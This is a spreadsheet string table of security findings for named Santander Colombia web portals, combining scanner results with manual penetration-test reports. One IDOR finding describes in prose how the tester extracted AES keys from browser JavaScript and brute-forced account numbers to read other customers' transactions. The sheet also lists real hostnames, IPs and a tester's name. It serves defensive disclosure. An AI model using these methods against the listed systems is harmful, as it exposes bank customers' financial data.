Claramente, se puede usar cualquiera de los dos, dependiendo de si queremos una política Default-Deny-Explicit-Allow o una política Default-Allow-Explicit-Deny. Para no permitir los métodos TRACE y TRACK a través de URLScan, primero elimine los métodos 'TRACK' y 'TRACE' de la sección 'AllowVerbs' y agréguelos a la sección 'DenyVerbs'. Con esto, URLScan no permitirá todos los métodos 'TRACE' y 'TRACK', y generará una página de error para todas las solicitudes que utilicen ese método. Para habilitar los cambios, reinicie el 'Servicio de publicación de la World Wide Web' desde el elemento del Panel de control 'Servicios'. Para más detalles sobre otros servidores web : Cert Advisory.</t>
  </si>
  <si>
    <t>QA-VM-7172697214895775080</t>
  </si>
  <si>
    <t>Web Server HTTP Trace/Track Method Support Cross-Site Tracing Vulnerability</t>
  </si>
  <si>
    <t>El servidor web remoto admite los métodos HTTP TRACE y/o TRACK, lo que facilita a los atacantes remotos el robo de cookies y credenciales de autenticación o la elusión del mecanismo de protección HttpOnly. Se requiere que el seguimiento / rastreo esté deshabilitado para cumplir con PCI.</t>
  </si>
  <si>
    <t>Deshabilite estos métodos en el archivo de configuración de su servidor web.</t>
  </si>
  <si>
    <t>QA-VM-8445736844288340302</t>
  </si>
  <si>
    <t>HTTP TRACE / TRACK Methods Enabled</t>
  </si>
  <si>
    <t>El servidor web tiene algunos directorios listables. Se puede obtener información muy confidencial de los listados de directorios.</t>
  </si>
  <si>
    <t>Deshabilite la exploración de directorios o la lista para todos los directorios.</t>
  </si>
  <si>
    <t>QA-VM-6710104514884330748</t>
  </si>
  <si>
    <t>Este QID informa de la ausencia de los siguientes encabezados HTTP según CWE-693: Error del mecanismo de protección: X-Frame-Options: Este encabezado de respuesta HTTP mejora la protección de las aplicaciones web contra ataques de clickjacking. El secuestro de clics, también conocido como "ataque de reparación de la interfaz de usuario", permite a un atacante utilizar varias capas transparentes u opacas para engañar a un usuario objetivo para que haga clic en un botón o enlace de otra página cuando tenía la intención de hacer clic en la página de nivel superior. X-XSS-Protection: Este encabezado HTTP habilita el filtro Cross-Site Scripting (XSS) integrado en el navegador para evitar ataques de secuencias de comandos entre sitios. X-XSS-Protección: 0; Deshabilita esta funcionalidad. X-Content-Type-Options: Este encabezado HTTP evita ataques basados en la discordancia de tipo MIME. El único valor posible es nosniff. Si su servidor devuelve X-Content-Type-Options: nosniff en la respuesta, el navegador se negará a cargar los estilos y scripts en caso de que tengan un tipo MIME incorrecto. Strict-Transport-Security: El encabezado de respuesta HTTP Strict-Transport-Security (HSTS) es una característica de seguridad que permite a un sitio web indicar a los navegadores que solo se debe comunicar con él mediante HTTPS, en lugar de usar HTTP. Lógica de detección de QID: Este QID no autenticado busca la presencia de las siguientes respuestas HTTP: Las directivas válidas para X-Frame-Options son: X-Frame-Options: DENY - La página no se puede mostrar en un marco, independientemente del sitio que intente hacerlo. X-Frame-Options: SAMEORIGIN: la página solo se puede mostrar en un marco en el mismo origen que la página en sí. X-Frame-Options: ALLOW-FROM RESOURCE-URL: la página solo se puede mostrar en un marco en el origen especificado. Las directivas válidas para X-XSS-Protections son: X-XSS-Protection: 1 - Habilita el filtrado XSS (generalmente predeterminado en los navegadores). Si se detecta un ataque de secuencias de comandos entre sitios, el navegador desinfectará la página (eliminará las partes inseguras). X-XSS-Protección: 1; mode=block - Habilita el filtrado XSS. En lugar de desinfectar la página, el navegador evitará la representación de la página si se detecta un ataque. X-XSS-Protección: 1; report=URI - Habilita el filtrado XSS. Si se detecta un ataque de secuencias de comandos entre sitios, el navegador desinfectará la página e informará de la infracción. Esto usa la funcionalidad de la directiva report-uri de CSP para enviar un informe. X-XSS-Protection: 0 deshabilita esta directiva y, por lo tanto, también se trata como no detectado. Una directiva válida para X-Content-Type-Options: nosniff Una directiva HSTS válida Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; incluirSubDominios][; precarga] NOTA: Todas las directivas de solo informe (cuando corresponda) se consideran inválidas.</t>
  </si>
  <si>
    <t>Nota: Para depurar mejor los resultados de este QID, se solicita que los clientes ejecuten comandos para simular la siguiente funcionalidad: curl -lkL --verbose. CWE-693: Falla del mecanismo de protección menciona lo siguiente: el producto no utiliza o utiliza incorrectamente un mecanismo de protección que proporciona suficiente defensa contra ataques dirigidos contra el producto. Un mecanismo de protección "faltante" se produce cuando la aplicación no define ningún mecanismo contra una determinada clase de ataque. Un mecanismo de protección "insuficiente" puede proporcionar algunas defensas, por ejemplo, contra los ataques más comunes, pero no protege contra todo lo que se pretende. Por último, un mecanismo "ignorado" se produce cuando un mecanismo está disponible y en uso activo dentro del producto, pero el desarrollador no lo ha aplicado en alguna ruta de código. Se recomienda a los clientes que establezcan los encabezados de respuesta HTTP X-Frame-Options, X-XSS-Protection, X-Content-Type-Options y Strict-Transport-Security. Dependiendo de su software de servidor, los clientes pueden establecer directivas en la configuración de su sitio o en los archivos Web.config. Algunos ejemplos son: Opciones de marco X: Apache: Encabezado siempre anexa X-Frame-Options SAMEORIGIN nginx: add_header X-Frame-Options SAMEORIGIN; HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME="X-Frame-Options" VALUE="SAMEORIGIN"&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt; X-XSS-Protección: Apache: Encabezado siempre establecido X-XSS-Protection "1; modo=bloque" PHP: header("X-XSS-Protection: 1; modo=bloque"); X-content-type-options: Apache: Header always set X-Content-Type-Options: nosniff HTTP Strict-Transport-Security: Apache: Encabezado siempre establecido Strict-Transport-Security "max-age=31536000; includeSubDomains" Nginx: add_header Estricta Seguridad de Transporte max-age=31536000; Nota: Los dispositivos de red que incluyen una consola HTTP/HTTPS con fines administrativos o de gestión a menudo no incluyen todos o algunos de los encabezados de seguridad. Este es un problema conocido y se recomienda ponerse en contacto con el proveedor para obtener una solución.</t>
  </si>
  <si>
    <t>An insecure CSP configuration was detected.</t>
  </si>
  <si>
    <t>teal.cdt.santander.com.co:80</t>
  </si>
  <si>
    <t>teal.cdt.santander.com.co:443</t>
  </si>
  <si>
    <t>QA-WAS-5983fd1e-c49e-4858-98fb-198eb1232a27</t>
  </si>
  <si>
    <t>QA-WAS-df902567-eaf8-4260-971b-eec61be1529f</t>
  </si>
  <si>
    <t>QA-WAS-256ea963-ea03-4ed3-9b2a-e6ad7c4efa92</t>
  </si>
  <si>
    <t>Portal de Información</t>
  </si>
  <si>
    <t>MAN-689db2cf07d3017240603433</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-006-AP-001</t>
  </si>
  <si>
    <t>9,5</t>
  </si>
  <si>
    <t>https://181.57.221.233/PortalDeInformacion:443</t>
  </si>
  <si>
    <t xml:space="preserve">  Las "Referencias Inseguras a Objetos de manera Directa" (IDOR) se producen cuando una aplicación proporciona acceso directo a los objetos en función de la entrada proporcionada por el usuario (Normalmente un identificador de objeto).   Esta vulnerabilidad permite a los atacantes evadir la autorización y acceder a los recursos directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema y más. Esto se debe al hecho de que la aplicación toma la entrada proporcionada por el usuario y la utiliza para recuperar un objeto sin realizar suficientes comprobaciones de autorización.       Un atacante puede evadir el sistema de autorización y acceder a los recursos del aplicativo directamente modificando el valor de un parámetro utilizado para apuntar directamente a un objeto. Dichos recursos pueden ser registros, entradas de bases de datos que pertenecen a otros usuarios, archivos en el sistema o cualquier tipo de información a la que no debería tener acceso de manera previa.       SCBD-25-CNMPO-006-AP-001:   El aplicativo no realiza una correcta comprobación del acceso a los recursos del usuario en el Backend, pudiendo acceder un usuario de manera directa a información no legítima modificando el identificador que referencia al objeto que muestra la información accesible.   En este caso particular, un usuario puede acceder de manera directa al histórico de transacciones realizadas desde la cuenta de cualquier usuario modificando valor del parámetro "cuenta" de la funcionalidad "Histórico de transacciones" el cual se envía a través de una estructura en formato JSON que se encuentra cifrada mediante el algoritmo AES.   A continuación se muestra el acceso a la información no autorizada al usuario. Dado que el parámetro JSON se envía de manera cifrada primero se ha de localizar el "vector de inicialización" y la "Key" utilizada para poder descifrar la información y una vez modificada volverla a cifrar para poder enviarla al servidor.   El acceso a los datos "Vector de inicialización" y "Key" se realiza a través de la consola JS del propio navegador web utilizado para acceder al aplicativo. Se han identificado los métodos JavaScript que realizan el cifrado/descifrado de información, aes256Decrypt y aes256Encrypt. Por otro lado, se establecen "breakpoints" en los métodos indicados para poder acceder a los valores de las variables "iv" y "key" antes de ser utilizadas. La siguiente ilustración muestra el acceso a los valores indicados.      Una vez localizados estos valores se pueden utilizar para descifrar la información cifrada      Para poder facilitar la tarea de cifrado y descifrado de información se utiliza un módulo que permite realizar fácilmente esta operativa en BurpSuite.      Disponiendo de los valores para poder cifrar y descifrar información se comprueba que existe una funcionalidad en la aplicación para poder acceder al histórico de transacciones realizadas en la cuenta de un determinado usuario      Comprobamos que al realizar la solicitud los datos se envían cifrados en el cuerpo de la petición HTTP.      Se utiliza el módulo de descifrado para comprobar los datos que se envían en la petición. Se comprueba que uno de los parámetros enviados es el número de cuenta.      Se realiza una ataque de fuerza bruta iterando el número de cuenta y cifrando los datos antes de ser enviados      Se comprueba que para cada número de cuenta el aplicativo devuelve tamaños distintos de respuesta lo que indica que se están devolviendo las transacciones realizadas por los distintos números de cuenta.      Si accedemos a una de las respuestas recibidas para la cuenta 830000030000 accedemos a las transacciones cifradas      A las que podemos acceder en texto claro utilizando la "key" y el "iv" obtenidos anteriormente, comprobando que las transacciones obtenidas son las de la cuenta 830000030000      La siguiente ilustración muestra las transacciones realizadas desde la cuenta 830000030000 cargadas en el aplicativo.</t>
  </si>
  <si>
    <t xml:space="preserve">  Se recomienda introducir mecanismos de validación basado en accesos por usuario o roles, para acceder a la información identificada y comprobar en el lado del servidor que el usuario tiene privilegios de acceso a la información consultada.</t>
  </si>
  <si>
    <t>Jenny Alejandra Rodriguez</t>
  </si>
  <si>
    <t>MAN-689dbd4407d3017240603434</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-006-AP-002</t>
  </si>
  <si>
    <t>Evasión de la lógica de negocio</t>
  </si>
  <si>
    <t>6,4</t>
  </si>
  <si>
    <t xml:space="preserve">  La aplicación debe garantizar que únicamente se puedan ingresar datos coherentes para la lógica de negocio en la propia aplicación. Así mismo, también se ha de realizar una validación de este tipo de lógica directamente en el lado del servidor para garantizar que un usuario malintencionado no haga uso de proxies intermedios para manipular estos datos para evadir las restricciones impuestas en el front-end, cuando esta información se encuentra en tránsito.   Las vulnerabilidades relacionadas con la validación de lógica de negocio son únicas ya que son específicas de cada aplicación debido a que tratan de modificar los datos lógicos que la aplicación acepta para su correcto funcionamiento.   En este caso particular es posible modificar información del aplicativo que se encuentran restringidos y que no se deberían poder modificar.       Un atacante puede hacer que una funcionalidad de la aplicación puede alterar su funcionamiento o forzar a que se comporte de una manera inesperada. De esta manera es posible evadir ciertas restricciones de lógica de negocio impuestas por la aplicación, o sobrepasar los límites impuestos por la misma.       SCBD-25-CNMPO-006-AP-002:   Durante las pruebas realizadas sobre la aplicación se ha podido comprobar que no se están aplicando las validaciones de la lógica de negocio pertinentes a la hora de modificar los datos personales restringidos de un usuario.   A continuación, se muestran evidencias de la evasión de la lógica de negocio en los que un usuario puede modificar sus datos personales restringidos como "Nombre", "Apellido" o "Cédula de identidad" entre otros:      La siguiente ilustración muestra los datos personales del usuario, se puede comprobar que existen datos que la aplicación no permite modificar.      Al enviar la petición para guardar los datos personales comprobamos que se envía cifrada.      Podemos utilizar los valores "iv" y "key" para cifrar y descifrar la información transmitida, tal y como se ha explicado en la vulnerabilidad "Referencias Inseguras a Objetos de manera Directa (IDOR)" descritas en este mismo documento. La siguiente captura muestra los datos en claro que se envían para realizar la modificación de los datos personales.      A modo de ejemplo se modifica el nombre del usuario (el cual es un campo no modificable) por "JOAN-TEST" y se cifra el contenido del JSON      Se envía la petición con el JSON modificado y cifrado. en AES con la "key" e "iv" correspondientes.      Como se puede comprobar los datos personales del usuario han sido modificados.</t>
  </si>
  <si>
    <t xml:space="preserve">  Tanto el front-end como el back-end de la aplicación deben verificar y validar que los datos introducidos por los usuarios cumplen con la lógica de negocio de cada funcionalidad de la aplicación y aplicar las restricciones pertinentes dependiendo de los tipos de datos que espera la aplicación.</t>
  </si>
  <si>
    <t>MAN-689dbfbe07d3017240603435</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-006-CO-003</t>
  </si>
  <si>
    <t>4,4</t>
  </si>
  <si>
    <t xml:space="preserve">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Conocer tipo concreto del servidor web utilizado para sustentar el aplicativo, y su versión, permite a un atacante localizar vulnerabilidades conocidas y los exploits apropiados para las mismas así como generar ataques más elaborados contra la plataforma.       SCBD-25-CNMPO-006-CO-003:   Durante las pruebas realizadas se ha comprobado que la cabecera de respuesta HTTP "Server" revelan información interna acerca del tipo de servidor y versión del mismo así como información de la infraestructura interna de la aplicación a través de la dirección URL https://181.57.221.233/PortalDeInformacion/#/login   A continuación, se incluye una evidencia de ejemplo que muestra la información del servidor expuesta.</t>
  </si>
  <si>
    <t xml:space="preserve">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t>
  </si>
  <si>
    <t>MAN-689dc1fa07d3017240603436</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-006-AP-004</t>
  </si>
  <si>
    <t>4,1</t>
  </si>
  <si>
    <t xml:space="preserve">  Se ha detectado que la aplicación devuelve información acerca del direccionamiento IP interno del servidor. Esta información podría ser utilizada por un atacante con el objetivo de recabar información para ataques futuros.   Este tipo de información puede ser accesible a través de las cabeceras HTTP, mensajes de error y/o páginas por defecto.       Un atacante podría utilizar esta vulnerabilidad para obtener información del direccionamiento IP del sistema, pudiendo llegar a localizar otros activos vulnerables en la red o mapear la red interna.       SCBD-25-CNMPO-006-AP-004:   La aplicación auditada divulga información acerca de direcciones IP internas utilizadas en el token de autenticación tipo Bearer de la aplicación.   A continuación, se muestra el token Bearer codificado en Base64:      Si decodificamos el token en Base64 comprobamos que se expone la dirección IP interna del servidor "180.26.130.49"</t>
  </si>
  <si>
    <t xml:space="preserve">  Se recomienda evitar que la aplicación devuelva al usuario información relativa al funcionamiento interno del servidor, como puede ser direccionamiento IP de la red interna en la que está ubicado el mismo.</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-006-CO-005</t>
  </si>
  <si>
    <t>Se recomienda denegar el uso de los métodos TRACE, OPTIONS y CONNECT siempre que sea
posible.
Además, los métodos PUT y DELETE únicamente han de ser permitidos únicamente en aplicaciones
de tipo API RESTFUL en las que se necesite su uso .
Por otro lado, los métodos GET, POST y HEAD son considerados como métodos seguros y han de
estar habilitados en todas las aplicaciones (HEAD es opcional) que utilicen los protocolos
HTTP/HTTPS para comunicarse.</t>
  </si>
  <si>
    <t>vulnerabilidad de gravedad media vista en la red más de 90 días después de la publicación de la CVE.</t>
  </si>
  <si>
    <t>QA-WAS-3f9ce292-fe00-4d38-b9fc-9e174ab9f7f9</t>
  </si>
  <si>
    <t>JWT token in Authorization header uses symmetric algorithm.</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/ApiContract/contract/1</t>
  </si>
  <si>
    <t>Durante el escaneo WAS, se observó que el token JWT utilizado en el encabezado de autorización contiene un algoritmo simétrico.</t>
  </si>
  <si>
    <t>Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-20</t>
  </si>
  <si>
    <t>Un atacante podría proporcionar valores inesperados y provocar un bloqueo del programa o un control arbitrario de la asignación de recursos, lo que provocaría un consumo excesivo de recursos como la memoria y la CPU.</t>
  </si>
  <si>
    <t>QA-WAS-a6fbaa31-47ea-4a2c-aa9a-e5c028fcb2b3</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/ApiContract/rubros?codigoProducto=RI</t>
  </si>
  <si>
    <t>Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-21</t>
  </si>
  <si>
    <t>QA-WAS-5d42c4b7-8e62-4db6-a212-19b643726fa7</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/apiDisclaimer/images/getIdByCategoria/1</t>
  </si>
  <si>
    <t>Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-22</t>
  </si>
  <si>
    <t>QA-WAS-747d2133-aa51-44c4-bb55-9f49e2890061</t>
  </si>
  <si>
    <t>https://portalpagos.santander.com.co/auth/apiri/configuracionGeneral/consultarConfiguraciones</t>
  </si>
  <si>
    <t>Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-23</t>
  </si>
  <si>
    <t>QA-WAS-4db93f29-e069-4833-a54b-629c73b6d6b1</t>
  </si>
  <si>
    <t>https://portalrecaudos.santander.com.co/auth/apiportal/configuracion/oauth2</t>
  </si>
  <si>
    <t>Revisa el token JWT establecido en el encabezado de Autorización para usar solo un algoritmo de firma seleccionado. Para mas detalles consulta el CWE-24</t>
  </si>
  <si>
    <t>MAN-685bc8716c975521ca412cf3</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-002-CO-004</t>
  </si>
  <si>
    <t>Evasión de firma de peticiones</t>
  </si>
  <si>
    <t>servicios.santander.com.co</t>
  </si>
  <si>
    <t>Durante el análisis del funcionamiento interno de la aplicación web, se identificó el mecanismo de cifrado utilizado para proteger datos sensibles transmitidos al backend, particularmente en el parámetro params</t>
  </si>
  <si>
    <t>No se debería de exponer el código de lógica de cifrado a internet</t>
  </si>
  <si>
    <t>Un atacante con acceso al código y a la lógica del cifrado, puede realizar un ejercicio de ingeniería inversa y ver las peticiones que se envían.</t>
  </si>
  <si>
    <t>MAN-685bc9936c975521ca412d1a</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-002-CO-005</t>
  </si>
  <si>
    <t>La aplicación expone una parte del código fuente interno de la aplicación a través del frontend. Normalmente esta fuga de información puede estar contenida en los  comentarios de la aplicación, aunque en ciertas ocasiones y dependiendo del lenguaje y framework utilizado para desarrollar la aplicación también es posible acceder al código fuente a través de peticiones específicas del framework.</t>
  </si>
  <si>
    <t>Se recomienda revisar el código de la aplicación y eliminar el código fuente interno de la aplicación.
Por otro lado, se ha de evitar que se pueda acceder directamente al código fuente interno de la
aplicación</t>
  </si>
  <si>
    <t>El código fuente expuesto permite a un atacante realizar ataques más dirigidos contra la plataforma. Adicionalmente, supone un riesgo reputacional para la organización</t>
  </si>
  <si>
    <t>MAN-685bcab26c975521ca412d1b</t>
  </si>
  <si>
    <t>SCBD-25-CNMPO-002-CO-006</t>
  </si>
  <si>
    <t>Ausencia de control de automatizaciones</t>
  </si>
  <si>
    <t>Muchas de las acciones o funcionalidades que presentan las aplicaciones requieren establecer límites en el número de veces que se puede realizar una determinada  funcionalidad o acción. Las aplicaciones deben controlar que un usuario no pueda exceder un límite en el uso de estas funcionalidades ya que, en determinados casos, cada vez que se utiliza la funcionalidad afectada en el aplicativo, el usuario puede obtener algún tipo de beneficio o causar algún tipo de acción no deseada sobre la aplicación. Por ejemplo: un sitio de comercio electrónico solo puede permitir que
los usuarios apliquen un descuento una vez por transacción o se pueda valorar y/o comentar una única vez cada producto obtenido.
Las vulnerabilidades relacionadas con las pruebas de los límites de función son específicas de cada aplicación en concreto y diseñar pruebas acordes a la funcionalidad y acciones de la propia aplicación.
Un atacante podría eludir la lógica de negocio y ejecutar una funcionalidad más veces de las permitidas obteniendo algún tipo de beneficio o acción malintencionada en la aplicación.</t>
  </si>
  <si>
    <t>La aplicación debe controlar la lógica de negocio para garantizar que una determinada
funcionalidad o acción solo puede ejecutarse un cierto número de veces limitado, cuando se
alcance el límite establecido, el usuario ya no puede ejecutar la funcionalidad.
Dependiendo de la acción afectada se controlará el número de veces que una acción se puede
utilizar, o las veces que se puede utilizar en un determinado intervalo de tiempo.</t>
  </si>
  <si>
    <t>La ausencia de controles para evitar automatizaciones puede dar lugar a diferentes tipos de ataque
como, por ejemplo, ataques de fuerza bruta para tratar de averiguar las credenciales de un usuario,
ataques de denegación de servicio al abusar de un formulario para obtener algún tipo de
descuento y otro tipo de ataques que resultan en la evasión de la lógica de negocio de la aplicación.</t>
  </si>
  <si>
    <t>PSE</t>
  </si>
  <si>
    <t>QA-WAS-5101867b-a7d6-43d2-b869-e74b2dd18dc0</t>
  </si>
  <si>
    <t>A Web server was detected that supports the HTTP TRACE method. This method allows debugging and connection trace analysis for connections from the client to the Web server. Per the HTTP specification, when this method is used, the Web server echoes back the information sent to it by the client unmodified and unfiltered. Microsoft IIS web server uses an alias TRACK for this method, and is functionally the same.
A vulnerability related to this method was discovered. A malicious, active component in a Web page can send Trace requests to a Web server that supports this Trace method. Usually, browser security disallows access to Web sites outside of the present site's domain. Although unlikely and difficult to achieve, it's possible, in the presence of other browser vulnerabilities, for the active HTML content to make external requests to arbitrary Web servers beyond the hosting Web server. Since the chosen Web server then echoes back the client request unfiltered, the response also includes cookie-based or Web-based (if logged on) authentication credentials that the browser automatically sent to the specified Web application on the specified Web server. 
The significance of the Trace capability in this vulnerability is that the active component in the page visited by the victim user has no direct access to this authentication information, but gets it after the target Web server echoes it back as its Trace response. 
Since this vulnerability exists as a support for a method required by the HTTP protocol specification, most common Web servers are vulnerable.
The exact method(s) supported, Trace and/or Track, and their responses are in the Results section below.
Track / Trace are required to be disabled to be PCI compliance.</t>
  </si>
  <si>
    <t>Solutions for some of the common Web servers are supplied below. For other Web servers, please check your vendor's documentation.
Apache: Recent Apache versions have a Rewrite module that allows HTTP requests to be rewritten or handled in a specific way. Compile the Apache server with the mod_rewrite module. You might need to uncomment the 'AddModule' and 'LoadModule' directives in the httpd.conf configuration file. Add the following lines for each virtualhost in your configuration file (Please note that, by default, Rewrite configurations are not inherited. This means that you need to have Rewrite directives for each virtual host in which you wish to use it):
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} ^TRACE
RewriteRule .* - [F]
&lt;/IfModule&gt;
With this configuration, Apache catches all TRACE requests, and replies with a page reporting the request as forbidden. None of the original request's contents are echoed back.
A slightly tighter fix is to use:
&lt;IfModule mod_rewrite.c&gt;
RewriteEngine on
RewriteCond %{REQUEST_METHOD} !^(GET|POST|HEAD)$
RewriteRule .* - [F]
&lt;/IfModule&gt;
Please note that RewriteEngine can be processor intensive and may impact the web server performance. The trace method can also be controlled by use of the TraceEnable directive.
In the httpd.conf add or modify:
TraceEnable Off
Microsoft IIS: Microsoft released URLScan, which can be used to screen all incoming requests based on customized rulesets. URLScan can be used to sanitize or disable the TRACE requests from the clients. Note that IIS aliases 'TRACK' to 'TRACE'. Therefore, if URLScan is used to specfically block the TRACE method, the TRACK method should also be added to the filter.
URLScan uses the 'urlscan.ini' configuration file, usually in \System32\InetSrv\URLScan directory. In that, we have two sections - AllowVerbs and DenyVerbs. The former is used if the UseAllowVerbs variable is set to 1, else (if its set to 0), the DenyVerbs are used. Clearly, either can be used, depending on whether we want a Default-Deny-Explicit-Allow or a Default-Allow-Explicit-Deny policy. To disallow TRACE and TRACK methods through URLScan, first remove 'TRACK', 'TRACE' methods from the 'AllowVerbs' section and add them to the 'DenyVerbs' section. With this, URLScan will disallow all 'TRACE' and 'TRACK' methods, and generate an error page for all requests using that method. To enable the changes, restart the 'World Wide Web Publishing Service' from the 'Services' Control Panel item.
For more details about other web servers : Cert Advisory.</t>
  </si>
  <si>
    <t>QA-WAS-6e8d73c9-14e2-4095-9745-3ae3b7909cda</t>
  </si>
  <si>
    <t>The remote Web server supports the TRACE and/or TRACK HTTP methods, which makes it easier for remote attackers to steal cookies and authentication credentials or bypass the HttpOnly protection mechanism.
Track / Trace are required to be disabled to be PCI compliance.</t>
  </si>
  <si>
    <t>Disable these methods in your web server's configuration file.</t>
  </si>
  <si>
    <t>QA-WAS-479933b6-0d1f-4aaa-a406-98e7a05aaf96</t>
  </si>
  <si>
    <t>The Web server has some listable directories. Very sensitive information can be obtained from directory listings.</t>
  </si>
  <si>
    <t>Disable directory browsing or listing for all directories.</t>
  </si>
  <si>
    <t>QA-WAS-3e98acce-f3da-420f-8957-a007ab621d93</t>
  </si>
  <si>
    <t>This QID reports the absence of the following HTTP headers according to CWE-693: Protection Mechanism Failure:
X-Frame-Options: This HTTP response header improves the protection of web applications against clickjacking attacks. Clickjacking, also known as a "UI redress attack", allows an attacker to use multiple transparent or opaque layers to trick a targeted user into clicking on a button or link on another page when they were intending to click on the the top level page. 
X-XSS-Protection: This HTTP header enables the browser built-in Cross-Site Scripting (XSS) filter to prevent cross-site scripting attacks. X-XSS-Protection: 0; disables this functionality.
X-Content-Type-Options: This HTTP header prevents attacks based on MIME-type mismatch. The only possible value is nosniff. If your server returns X-Content-Type-Options: nosniff in the response, the browser will refuse to load the styles and scripts in case they have an incorrect MIME-type. 
Strict-Transport-Security: The HTTP Strict-Transport-Security response header (HSTS) is a security feature that lets a web site tell browsers that it should only be communicated with using HTTPS, instead of using HTTP.
QID Detection Logic:
This unauthenticated QID looks for the presence of the following HTTP responses:
Valid directives for X-Frame-Options are:
X-Frame-Options: DENY - The page cannot be displayed in a frame, regardless of the site attempting to do so.
X-Frame-Options: SAMEORIGIN - The page can only be displayed in a frame on the same origin as the page itself.
X-Frame-Options: ALLOW-FROM RESOURCE-URL - The page can only be displayed in a frame on the specified origin.
Valid directives for X-XSS-Protections are:
X-XSS-Protection: 1 - Enables XSS filtering (usually default in browsers). If a cross-site scripting attack is detected, the browser will sanitize the page (remove the unsafe parts).
X-XSS-Protection: 1; mode=block - Enables XSS filtering. Rather than sanitizing the page, the browser will prevent rendering of the page if an attack is detected.
X-XSS-Protection: 1; report=URI  - Enables XSS filtering. If a cross-site scripting attack is detected, the browser will sanitize the page and report the violation. This uses the functionality of the CSP report-uri directive to send a report.
X-XSS-Protection: 0 disables this directive and hence is also treated as not detected.
A valid directive for X-Content-Type-Options: nosniff
A valid HSTS directive Strict-Transport-Security: max-age=&lt;expire-time&gt;; [; includeSubDomains][; preload]
NOTE: All report-only directives (where applicable) are considered invalid.</t>
  </si>
  <si>
    <t>Note: To better debug the results of this QID, it is requested that customers execute commands to simulate the following functionality: curl -lkL --verbose.
CWE-693: Protection Mechanism Failure mentions the following - The product does not use or incorrectly uses a protection mechanism that provides sufficient defense against directed attacks against the product. A "missing" protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An "insufficient" protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an "ignored" mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.
Customers are advised to set proper X-Frame-Options, X-XSS-Protection, X-Content-Type-Options and Strict-Transport-Security HTTP response headers.
Depending on their server software, customers can set directives in their site configuration or Web.config files. Few examples are:
X-Frame-Options:
Apache: Header always append X-Frame-Options SAMEORIGIN
nginx: add_header X-Frame-Options SAMEORIGIN;
HAProxy: rspadd X-Frame-Options:\ SAMEORIGIN
IIS: &lt;HTTPPROTOCOL&gt;&lt;CUSTOMHEADERS&gt;&lt;ADD NAME="X-Frame-Options" VALUE="SAMEORIGIN"&gt;&lt;/ADD&gt;&lt;/CUSTOMHEADERS&gt;&lt;/HTTPPROTOCOL&gt;
X-XSS-Protection:
Apache: Header always set X-XSS-Protection "1; mode=block" 
PHP: header("X-XSS-Protection: 1; mode=block");
X-Content-Type-Options:
Apache: Header always set X-Content-Type-Options: nosniff
HTTP Strict-Transport-Security:
Apache: Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
Nginx: add_header Strict-Transport-Security max-age=31536000;
Note: Network devices that include a HTTP/HTTPS console for administrative/management purposes often do not include all/some of the security headers. This is a known issue and it is recommend to contact the vendor for a solution.</t>
  </si>
  <si>
    <t>QA-WAS-57766916-2885-4af4-bd93-4d835ceee0b2</t>
  </si>
  <si>
    <t>The web page can be framed. This means that clickjacking attacks against users are possible.</t>
  </si>
  <si>
    <t>QA-WAS-d8d6ab57-6c02-43a0-9b90-4931ebb67944</t>
  </si>
  <si>
    <t>QA-WAS-fe5e927d-d961-4c67-b147-521a7692d68b</t>
  </si>
  <si>
    <t>The Web server presents a directory listing.</t>
  </si>
  <si>
    <t>QA-WAS-5d7bb25f-705e-4409-b0a2-0ff116aed6e9</t>
  </si>
  <si>
    <t>QA-WAS-7023526d-f423-42dc-b894-f6e770070ae9</t>
  </si>
  <si>
    <t>QA-WAS-c6bc736a-a867-479c-98eb-3e5c384a1b65</t>
  </si>
  <si>
    <t>QA-WAS-aff5a77d-696b-4c6b-a827-f46bbb3683d9</t>
  </si>
  <si>
    <t>QA-WAS-a8548726-b3f7-441a-84a3-56fc77a7f34e</t>
  </si>
  <si>
    <t>QA-WAS-fb4867b9-a817-488d-85ae-c68f89aa59bf</t>
  </si>
  <si>
    <t>QA-WAS-a62e6542-0d84-4925-85ff-395c81615efd</t>
  </si>
  <si>
    <t>QA-WAS-3bdab847-80ec-4f89-bfd4-d207e2a34ba3</t>
  </si>
  <si>
    <t>QA-WAS-c918499c-9bcc-4283-9aaf-0d0e6bcaa37e</t>
  </si>
  <si>
    <t>QA-WAS-fd9034b5-2ac6-4d8b-884c-2772717ccf2a</t>
  </si>
  <si>
    <t>QA-WAS-87b593a9-ba0f-4310-97dc-9c0d0bb8332f</t>
  </si>
  <si>
    <t>QA-WAS-d0d0535a-191b-4771-9d82-8e5eea8c8da1</t>
  </si>
  <si>
    <t>QA-WAS-5d974671-0ee9-49cb-80af-7e3d9781879a</t>
  </si>
  <si>
    <t>QA-WAS-7c872ea0-e43b-4cce-b92b-288bd1f496b1</t>
  </si>
  <si>
    <t>QA-WAS-141c03a2-c239-474d-ab3a-8635c71ba7b9</t>
